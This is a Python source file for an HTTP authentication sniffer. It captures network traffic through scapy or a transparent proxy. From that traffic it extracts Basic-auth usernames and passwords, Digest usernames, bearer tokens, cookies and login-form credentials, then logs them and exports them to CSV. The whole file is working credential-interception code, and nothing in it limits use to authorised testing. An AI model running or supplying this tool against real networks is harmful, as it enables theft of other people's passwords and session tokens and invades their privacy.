"""HTTP Authentication Sniffer.

Captures Basic, Digest, and form-based credentials from HTTP traffic.
"""

import asyncio
import base64
import hashlib
import logging
import re
from dataclasses import dataclass, field
from typing import Optional, Callable
from datetime import datetime
from enum import Enum, auto

logger = logging.getLogger(__name__)


class AuthType(Enum):
    """HTTP authentication types."""
    BASIC = auto()
    DIGEST = auto()
    FORM = auto()
    BEARER = auto()
    COOKIE = auto()


@dataclass
class CapturedCredential:
    """Captured HTTP credential."""
    timestamp: datetime
    auth_type: AuthType
    source_ip: str
    source_port: int
    dest_ip: str
    dest_port: int
    host: str
    path: str
    username: Optional[str] = None
    password: Optional[str] = None
    token: Optional[str] = None
    cookie: Optional[str] = None
    raw_data: Optional[str] = None
    
    def __str__(self) -> str:
        if self.auth_type == AuthType.BASIC:
            return f"[Basic] {self.host}{self.path} - {self.username}:{self.password}"
        elif self.auth_type == AuthType.FORM:
            return f"[Form] {self.host}{self.path} - {self.username}:{self.password}"
        elif self.auth_type == AuthType.BEARER:
            return f"[Bearer] {self.host}{self.path} - {self.token[:20]}..."
        elif self.auth_type == AuthType.COOKIE:
            return f"[Cookie] {self.host}{self.path} - {self.cookie[:30]}..."
        else:
            return f"[{self.auth_type.name}] {self.host}{self.path}"


@dataclass
class HTTPSnifferConfig:
    """HTTP sniffer configuration."""
    interface: str = "eth0"
    ports: list[int] = field(default_factory=lambda: [80, 8080, 8000, 8888])
    capture_basic: bool = True
    capture_digest: bool = True
    capture_forms: bool = True
    capture_cookies: bool = False  # Can be noisy
    capture_bearer: bool = True
    
    # Form field patterns for credential detection
    username_fields: list[str] = field(default_factory=lambda: [
        'user', 'username', 'email', 'login', 'uid', 'name', 'account'
    ])
    password_fields: list[str] = field(default_factory=lambda: [
        'pass', 'password', 'passwd', 'pwd', 'secret', 'credential'
    ])
    
    # Filtering
    target_hosts: list[str] = field(default_factory=list)
    ignore_hosts: list[str] = field(default_factory=list)


class HTTPParser:
    """Parse HTTP requests for credentials."""
    
    def __init__(self, config: HTTPSnifferConfig):
        self.config = config
    
    def parse_request(
        self,
        data: bytes,
        source_ip: str,
        source_port: int,
        dest_ip: str,
        dest_port: int
    ) -> list[CapturedCredential]:
        """Parse HTTP request and extract credentials."""
        credentials = []
        
        try:
            # Decode request
            text = data.decode('utf-8', errors='ignore')
            lines = text.split('\r\n')
            
            if not lines:
                return credentials
            
            # Parse request line
            request_line = lines[0]
            parts = request_line.split(' ')
            if len(parts) < 2:
                return credentials
            
            method = parts[0]
            path = parts[1]
            
            # Parse headers
            headers = {}
            body_start = 0
            for i, line in enumerate(lines[1:], 1):
                if ':' in line:
                    key, value = line.split(':', 1)
                    headers[key.strip().lower()] = value.strip()
                elif line == '':
                    body_start = i + 1
                    break
            
            host = headers.get('host', dest_ip)
            
            # Check filters
            if self.config.target_hosts:
                if not any(t in host for t in self.config.target_hosts):
                    return credentials
            
            if self.config.ignore_hosts:
                if any(i in host for i in self.config.ignore_hosts):
                    return credentials
            
            # Check Authorization header
            auth_header = headers.get('authorization', '')
            
            if auth_header:
                # Basic Auth
                if auth_header.lower().startswith('basic ') and self.config.capture_basic:
                    cred = self._parse_basic_auth(
                        auth_header, source_ip, source_port,
                        dest_ip, dest_port, host, path
                    )
                    if cred:
                        credentials.append(cred)
                
                # Digest Auth
                elif auth_header.lower().startswith('digest ') and self.config.capture_digest:
                    cred = self._parse_digest_auth(
                        auth_header, source_ip, source_port,
                        dest_ip, dest_port, host, path
                    )
                    if cred:
                        credentials.append(cred)
                
                # Bearer Token
                elif auth_header.lower().startswith('bearer ') and self.config.capture_bearer:
                    cred = self._parse_bearer_auth(
                        auth_header, source_ip, source_port,
                        dest_ip, dest_port, host, path
                    )
                    if cred:
                        credentials.append(cred)
            
            # Check form data (POST)
            if method == 'POST' and self.config.capture_forms and body_start > 0:
                body = '\r\n'.join(lines[body_start:])
                form_creds = self._parse_form_data(
                    body, source_ip, source_port,
                    dest_ip, dest_port, host, path
                )
                credentials.extend(form_creds)
            
            # Check cookies
            if self.config.capture_cookies and 'cookie' in headers:
                cred = CapturedCredential(
                    timestamp=datetime.now(),
                    auth_type=AuthType.COOKIE,
                    source_ip=source_ip,
                    source_port=source_port,
                    dest_ip=dest_ip,
                    dest_port=dest_port,
                    host=host,
                    path=path,
                    cookie=headers['cookie']
                )
                credentials.append(cred)
            
        except Exception as e:
            logger.debug(f"HTTP parse error: {e}")
        
        return credentials
    
    def _parse_basic_auth(
        self,
        auth_header: str,
        source_ip: str,
        source_port: int,
        dest_ip: str,
        dest_port: int,
        host: str,
        path: str
    ) -> Optional[CapturedCredential]:
        """Parse Basic authentication."""
        try:
            encoded = auth_header.split(' ', 1)[1]
            decoded = base64.b64decode(encoded).decode('utf-8', errors='ignore')
            
            if ':' in decoded:
                username, password = decoded.split(':', 1)
                return CapturedCredential(
                    timestamp=datetime.now(),
                    auth_type=AuthType.BASIC,
                    source_ip=source_ip,
                    source_port=source_port,
                    dest_ip=dest_ip,
                    dest_port=dest_port,
                    host=host,
                    path=path,
                    username=username,
                    password=password,
                    raw_data=auth_header
                )
        except Exception:
            pass
        return None
    
    def _parse_digest_auth(
        self,
        auth_header: str,
        source_ip: str,
        source_port: int,
        dest_ip: str,
        dest_port: int,
        host: str,
        path: str
    ) -> Optional[CapturedCredential]:
        """Parse Digest authentication."""
        try:
            # Extract username from Digest header
            username_match = re.search(r'username="([^"]+)"', auth_header)
            if username_match:
                username = username_match.group(1)
                return CapturedCredential(
                    timestamp=datetime.now(),
                    auth_type=AuthType.DIGEST,
                    source_ip=source_ip,
                    source_port=source_port,
                    dest_ip=dest_ip,
                    dest_port=dest_port,
                    host=host,
                    path=path,
                    username=username,
                    raw_data=auth_header
                )
        except Exception:
            pass
        return None
    
    def _parse_bearer_auth(
        self,
        auth_header: str,
        source_ip: str,
        source_port: int,
        dest_ip: str,
        dest_port: int,
        host: str,
        path: str
    ) -> Optional[CapturedCredential]:
        """Parse Bearer token."""
        try:
            token = auth_header.split(' ', 1)[1]
            return CapturedCredential(
                timestamp=datetime.now(),
                auth_type=AuthType.BEARER,
                source_ip=source_ip,
                source_port=source_port,
                dest_ip=dest_ip,
                dest_port=dest_port,
                host=host,
                path=path,
                token=token,
                raw_data=auth_header
            )
        except Exception:
            pass
        return None
    
    def _parse_form_data(
        self,
        body: str,
        source_ip: str,
        source_port: int,
        dest_ip: str,
        dest_port: int,
        host: str,
        path: str
    ) -> list[CapturedCredential]:
        """Parse form POST data for credentials."""
        credentials = []
        
        try:
            # Parse URL-encoded form data
            from urllib.parse import parse_qs, unquote_plus
            
            params = {}
            for pair in body.split('&'):
                if '=' in pair:
                    key, value = pair.split('=', 1)
                    params[unquote_plus(key).lower()] = unquote_plus(value)
            
            # Find username and password fields
            username = None
            password = None
            
            for field in self.config.username_fields:
                for key, value in params.items():
                    if field in key.lower():
                        username = value
                        break
                if username:
                    break
            
            for field in self.config.password_fields:
                for key, value in params.items():
                    if field in key.lower():
                        password = value
                        break
                if password:
                    break
            
            if username or password:
                credentials.append(CapturedCredential(
                    timestamp=datetime.now(),
                    auth_type=AuthType.FORM,
                    source_ip=source_ip,
                    source_port=source_port,
                    dest_ip=dest_ip,
                    dest_port=dest_port,
                    host=host,
                    path=path,
                    username=username,
                    password=password,
                    raw_data=body[:500]  # Truncate for storage
                ))
            
        except Exception as e:
            logger.debug(f"Form parse error: {e}")
        
        return credentials


class HTTPAuthSniffer:
    """Sniff HTTP traffic for authentication credentials."""
    
    def __init__(self, config: Optional[HTTPSnifferConfig] = None):
        self.config = config or HTTPSnifferConfig()
        self._parser = HTTPParser(self.config)
        self._credentials: list[CapturedCredential] = []
        self._running = False
        self._on_credential_callback: Optional[Callable[[CapturedCredential], None]] = None
    
    def on_credential(self, callback: Callable[[CapturedCredential], None]) -> None:
        """Set callback for captured credentials."""
        self._on_credential_callback = callback
    
    async def start(self) -> None:
        """Start HTTP sniffer."""
        self._running = True
        logger.info(f"HTTP sniffer started on ports {self.config.ports}")
        
        # Start packet capture using scapy or raw sockets
        await self._capture_loop()
    
    async def _capture_loop(self) -> None:
        """Main capture loop using raw sockets."""
        try:
            # Try to use scapy for packet capture
            from scapy.all import sniff, TCP, IP, Raw
            
            def packet_callback(packet):
                if not self._running:
                    return
                
                if packet.haslayer(TCP) and packet.haslayer(Raw):
                    tcp = packet[TCP]
                    if tcp.dport in self.config.ports or tcp.sport in self.config.ports:
                        try:
                            data = bytes(packet[Raw].load)
                            if b'HTTP' in data or b'GET' in data or b'POST' in data:
                                ip = packet[IP]
                                creds = self._parser.parse_request(
                                    data,
                                    ip.src, tcp.sport,
                                    ip.dst, tcp.dport
                                )
                                for cred in creds:
                                    self._handle_credential(cred)
                        except Exception:
                            pass
            
            # Run sniff in thread
            loop = asyncio.get_event_loop()
            await loop.run_in_executor(
                None,
                lambda: sniff(
                    iface=self.config.interface,
                    filter=f"tcp port {' or tcp port '.join(map(str, self.config.ports))}",
                    prn=packet_callback,
                    store=0,
                    stop_filter=lambda _: not self._running
                )
            )
            
        except ImportError:
            logger.warning("Scapy not available, using basic socket capture")
            await self._basic_capture()
    
    async def _basic_capture(self) -> None:
        """Basic capture without scapy."""
        # Fallback implementation using proxy servers
        for port in self.config.ports:
            asyncio.create_task(self._proxy_server(port))
        
        while self._running:
            await asyncio.sleep(1)
    
    async def _proxy_server(self, port: int) -> None:
        """Simple transparent proxy for HTTP capture."""
        try:
            server = await asyncio.start_server(
                lambda r, w: self._handle_proxy_client(r, w, port),
                '0.0.0.0',
                port + 10000  # Offset to avoid conflicts
            )
            logger.info(f"HTTP proxy started on port {port + 10000}")
            
            async with server:
                await server.serve_forever()
        except Exception as e:
            logger.error(f"Proxy server error on port {port}: {e}")
    
    async def _handle_proxy_client(
        self,
        reader: asyncio.StreamReader,
        writer: asyncio.StreamWriter,
        original_port: int
    ) -> None:
        """Handle proxied HTTP client."""
        addr = writer.get_extra_info('peername')
        
        try:
            data = await asyncio.wait_for(reader.read(8192), timeout=30)
            if data:
                creds = self._parser.parse_request(
                    data,
                    addr[0], addr[1],
                    '0.0.0.0', original_port
                )
                for cred in creds:
                    self._handle_credential(cred)
        except Exception:
            pass
        finally:
            writer.close()
            await writer.wait_closed()
    
    def _handle_credential(self, cred: CapturedCredential) -> None:
        """Handle captured credential."""
        self._credentials.append(cred)
        
        if self._on_credential_callback:
            self._on_credential_callback(cred)
        
        logger.info(f"Captured: {cred}")
    
    async def stop(self) -> None:
        """Stop HTTP sniffer."""
        self._running = False
        logger.info("HTTP sniffer stopped")
    
    @property
    def credentials(self) -> list[CapturedCredential]:
        """Get captured credentials."""
        return self._credentials.copy()
    
    def export_csv(self, filepath: str) -> int:
        """Export credentials to CSV."""
        import csv
        
        with open(filepath, 'w', newline='') as f:
            writer = csv.writer(f)
            writer.writerow([
                'Timestamp', 'Type', 'Host', 'Path',
                'Username', 'Password', 'Token', 'Source IP'
            ])
            for cred in self._credentials:
                writer.writerow([
                    cred.timestamp.isoformat(),
                    cred.auth_type.name,
                    cred.host,
                    cred.path,
                    cred.username or '',
                    cred.password or '',
                    cred.token or '',
                    cred.source_ip
                ])
        return len(self._credentials)
    
    def clear(self) -> None:
        """Clear captured credentials."""
        self._credentials.clear()

